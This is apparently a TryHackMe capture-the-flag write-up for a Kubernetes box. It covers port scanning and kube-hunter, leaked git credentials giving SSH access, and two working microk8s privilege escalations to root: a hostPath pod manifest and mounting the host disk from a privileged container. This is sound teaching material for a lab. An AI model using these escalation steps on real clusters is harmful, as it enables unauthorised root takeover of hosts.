# Try Hack Me - Frank & Herby Make an App

**Categories:** Security, Kubernetes, Containers, Challenge  
**Difficulty:** Medium  

Commands used in this guide use the exported variable $IP (`export IP=10.10.143.248`) in place of the target machine's IP address.

At the time of writing the machine had some issues with stability. Be sure to wait 5 minutes before staring enumeration and restart the box if required services become unavailable.

I know just enough k8s and kubectl to be dangerous (a bit like Frank and Herby...). Please get in touch to correct any k8s nonsense you may find in this walkthrough.

## 1: Enumeration - rustscan, nmap, kube-hunter

Effective enumeration of the box is difficult due to its instability, but the room's tasks makes this easier by providing some information on what we're looking for. Your rustscan results will vary minute by minute, but eventually you should find around 8-9 open ports (most importantly, 22, 10255 and 31337), allowing for an nmap service version scan on the discovered ports : 

```console
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
10250/tcp open  ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
10255/tcp open  http     Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
25000/tcp open  ssl/http Gunicorn 19.7.1
31337/tcp open  http     nginx 1.21.3
32000/tcp open  unknown
```

Nmap isn't massively helpful here - it does find the OpenSSH version (no relevant vulnerabilities) and the nginx instance and version (no relevant vulnerabilities) on 31337. It also confirms that services are running on 10250 and 10255, ports used by [Kubernete's Kubelet, the Kubernetes component responsible for provisioning and managing containers on the node](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/). 

We can further investigate the state of the Kubernete's cluster on the target with [Kube-hunter, a Kubernetes enumeration tool](https://github.com/aquasecurity/kube-hunter) - Kube-hunter basically queries the previously discovered API services at 10250 and 10255 to provide additional information on the cluster's configuration and potential vulnerabilities : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/frank-herby]
└─$ sudo docker run -it --rm --network host aquasec/kube-hunter
Choose one of the options below:
1. Remote scanning      (scans one or more specific IPs or DNS names)
2. Interface scanning   (scans subnets on all local network interfaces)
3. IP range scanning    (scans a given IP range)
Your choice: 1
Remotes (separated by a ','): 10.10.143.248
2021-11-08 04:06:35,939 INFO kube_hunter.modules.report.collector Started hunting
...snip...
+--------+---------------------+----------------------+----------------------+----------------------+----------------------+
| ID     | LOCATION            | MITRE CATEGORY       | VULNERABILITY        | DESCRIPTION          | EVIDENCE             |
+--------+---------------------+----------------------+----------------------+----------------------+----------------------+
| KHV044 | 10.10.143.248:10255 | Privilege Escalation | Privileged Container | A Privileged         | pod: calico-         |
|        |                     | // Privileged        |                      | container exist on a | node-6595k,          |
|        |                     | container            |                      | node                 | container: calico-   |
|        |                     |                      |                      |     could expose the | node, count: 1       |
|        |                     |                      |                      | node/cluster to      |                      |
|        |                     |                      |                      | unwanted root        |                      |
|        |                     |                      |                      | operations           |                      |
+--------+---------------------+----------------------+----------------------+----------------------+----------------------+
```

Kube-hunter identifies a privileged container running in the calico-node-6595k pod. [Privileged containers present a number of options for privilege escalation on the machine hosting the Kubernete's cluser](https://www.trendmicro.com/en_us/research/19/l/why-running-a-privileged-container-in-docker-is-a-bad-idea.html), but cannot be exploited remotely (unless an additional vulnerability provides RCE within the privileged container).

## 2: Foothold - gobuster, credential disclosure

Returning to the nmap results, we have an nginx instance running on 31337. Accessing the application reveals a generic Bootstrap web page with no external links, no features, and no additional points of leverage. Turning to my go-to gobuster scan using dirbuster's medium wordlist (`gobuster dir -u $IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`) reveals nothing, but a different wordlist gets the following result : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/frank-herby]
└─$ gobuster dir -u http://$IP:31337 -w /usr/share/seclists/Discovery/Web-Content/dirsearch.txt
...snip...
/.git-credentials     (Status: 200) [Size: 50]  
...snip...
```

Curling the `/.git-credentials` route reveals URL encoded credentials for the frank user :

```console
┌──(kali㉿kali)-[~/Documents/tthm/frank-herby]
└─curl $IP:31337/.git-credentials
http://frank:PASSWORD@192.168.100.50
```

and these credentials also provide access through SSH :

```console
┌──(kali㉿kali)-[~/Documents/tthm/frank-herby]
└─$ ssh frank@$IP
frank@10.10.143.248's password: 
...snip...
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-89-generic x86_64)
frank@dev-01:~$ id
uid=1001(frank) gid=1001(frank) groups=1001(frank),998(microk8s)
```

The user flag is at `/home/frank/user.txt`.

## 3: Privesc version 1, frank -> root - CVE-2019-15789

I found 2 similar but distinct ways to privesc from frank to root, both of which exploit frank's membership of the microk8s group and both of which will go presented here. Given the breadth of the permissions available to members of the microk8s group (and the complexity of safe k8s configs...) it is likely that there are other methods.


A google search for "microk8s privelege escalation" throws up [CVE-2019-15789](https://nvd.nist.gov/vuln/detail/CVE-2019-15789), allowing low-privilege users to privesc on the host by provisioning a new container that mounts the host's file system. Whilst this has been fixed for low-privilege users, it is still possible to perform this "exploit" as a member of the microk8s group (this is not really an exploit, as members of the microk8s group are expected to perform high-privilege actions on the cluster). The same search also finds an exploit POC that includes a basic pod definition .yaml file that mounts the host's root at `/opt/root` ([credit to Denis Andzakovic at Pulse Security](https://pulsesecurity.co.nz/advisories/microk8s-privilege-escalation)) :

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hostmount
spec:
  containers:
  - name: shell
    image: ubuntu:latest
    command:
      - "bin/bash"
      - "-c"
      - "sleep 10000"
    volumeMounts:
      - name: root
        mountPath: /opt/root
  volumes:
  - name: root
    hostPath:
      path: /
      type: Directory
```

Trying to run this POC as-is will result in an ImagePullErr for the new container. We can presume that this is either because the microk8s instance on the box can't reach the internet (no THM boxes can reach the internet), or because the local registry serving the cluster has no "ubuntu:latest" image. This feels like a show stopper, but the Kube-hunter output we saw in section 2 told us that there were other pods running on the machine - if their images came from a local registry, we may be able to reuse the same image in our exploit. To get information on the running pods, we can use kubectl - [if you're rusty on kubectl commands, the official cheat sheet is a great resource](https://kubernetes.io/docs/reference/kubectl/cheatsheet/) : 

```console
frank@dev-01:~$ microk8s kubectl get pods
NAME                                READY   STATUS    RESTARTS   AGE
nginx-deployment-7b548976fd-77v4r   1/1     Running   2          11d
```

So we've find a running pod, but this doesn't give us the image definition used to build its containers - this requires another kubectl command to output the pod's configuraiton in yaml, revealing an image available at a local registry running on localhost:32000 :

```console
frank@dev-01:~$ microk8s kubectl get pod nginx-deployment-7b548976fd-77v4r -o yaml
apiVersion: v1
kind: Pod
metadata:
  annotations:
    cni.projectcalico.org/podIP: 10.1.133.238/32
...snip...
spec:
  containers:
  - image: localhost:32000/bsnginx
    imagePullPolicy: Always
```

We can use this image in a revised version of the pod configuration file included above. Start by changing the "image" key of this file from "ubuntu:latest" to "localhost:32000/bsnginx" and save the resulting file as "exploit.yaml". We can now follow the exploit POC, applying the new pod definition to the cluster : 

```console
frank@dev-01:~$ microk8s kubectl apply -f exploit.yaml
pod/hostmount created
```

and creating a shell session in the new container, accessing the host's root directory at `/opt/root` : 

```console
frank@dev-01:~$ microk8s kubectl exec -it hostmount /bin/bash
kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.
root@hostmount:/# ls /opt/root/root
root.txt  snap
```

The root flag is at `/opt/root/root/root.txt` (i.e. `/root/root.txt` on the host machine). 

## 4: Privesc version 2, frank -> root - privileged container

The second privilege escalation method exploits the privilege container discovered by Kube-hunter. Privileged containers come with a number of normal security measures disabled, providing direct access to resources on the host system - in this case, we'll be exploiting the fact that the host file system is available for mounting through the container's `/dev` directory ([the exploit we're using here is borrowed from BishopFox's BadPod series](https://github.com/BishopFox/badPods/tree/main/manifests/priv)). As we didn't see the "calico-node-6595k" pod when running `kubectl get pods` in the previous example, it is likely running in a separate namespace - add the "-A" flag to the same command to see all pods in all namespaces :

```console
frank@dev-01:~$ microk8s kubectl get pods -A
NAMESPACE            NAME                                      READY   STATUS    RESTARTS   AGE
kube-system          hostpath-provisioner-5c65fbdb4f-29k5w     1/1     Running   8          35d
container-registry   registry-9b57d9df8-2qbbs                  1/1     Running   8          35d
default              nginx-deployment-7b548976fd-77v4r         1/1     Running   2          11d
kube-system          coredns-7f9c69c78c-hpsnw                  1/1     Running   7          35d
kube-system          calico-node-6595k                         1/1     Running   8          35d
kube-system          calico-kube-controllers-f7868dd95-xkk4w   0/1     Running   9          35d
```

As the pod is running in the kube-system namespace, we'll first to have to set the default namespace to "kube-system" : 

```console
frank@dev-01:~$ microk8s kubectl config set-context --current --namespace=kube-system
Context "microk8s" modified.
```

We then start the exploit by running [`fdisk -l`](https://man7.org/linux/man-pages/man8/fdisk.8.html#OPTIONS) in the privileged container to show all available disk partitions, one of which will contain the host file system. Most examples of this exploit will target the `/dev/sda1` partition, but in our case it's `/dev/dm-0` :

```console
frank@dev-01:~$ microk8s kubectl exec -it calico-node-6595k -- fdisk -l
...snip...
Disk /dev/dm-0: 15 GiB, 16101933056 bytes, 31449088 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
...snip...
```

We then make a directory as a mount point, and mount the `/dev/dm-0` partition to the new directory (you could also run these commands within a shell session inside the container - you do you) :

```console
frank@dev-01:~$ microk8s kubectl exec -it calico-node-6595k -- mkdir /exploit-mount
frank@dev-01:~$ microk8s kubectl exec -it calico-node-6595k -- bash -c "mount /dev/dm-0 /exploit-mount/"
```

After launching a bash shell in the privileged container, we're at the same point as we were in the previous privesc example - this time the root flag is at `/exploit-mount/root/root.txt` :

```console
frank@dev-01:~$ microk8s kubectl exec -it calico-node-6595k /bin/bash
[root@dev-01 /]# ls -la /exploit-mount/root
total 32
drwx------  4 root root 4096 Oct 29 10:17 .
drwxr-xr-x 21 root root 4096 Oct 29 10:15 ..
lrwxrwxrwx  1 root root    9 Oct 29 10:17 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4096 Oct  3 15:29 .ssh
-rw-------  1 root root  705 Oct 27 20:19 .viminfo
-rw-r--r--  1 root root   21 Oct 27 20:20 root.txt
drwxr-xr-x  5 root root 4096 Oct  3 16:53 snap
```
